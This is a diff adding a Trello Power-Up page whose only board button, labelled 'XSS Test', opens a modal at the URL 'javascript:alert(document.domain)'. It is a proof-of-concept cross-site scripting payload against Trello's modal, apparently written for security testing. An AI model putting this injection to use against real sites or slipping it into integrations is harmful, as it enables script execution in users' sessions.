@@ -1,0 +1,25 @@
+<!-- index.html -->
+<html>
+<head>
+    <script src="https://p.trellocdn.com/power-up.min.js"></script>
+</head>
+<body>
+<script>
+    var Promise = TrelloPowerUp.Promise;
+
+    TrelloPowerUp.initialize({
+        'board-buttons': function(t, options) {
+            return [{
+                text: 'XSS Test',
+                callback: function(t) {
+                    return t.modal({
+                        url: 'javascript:alert(document.domain)',
+                        title: 'Test Modal'
+                    });
+                }
+            }];
+        }
+    });
+</script>
+</body>
+</html>
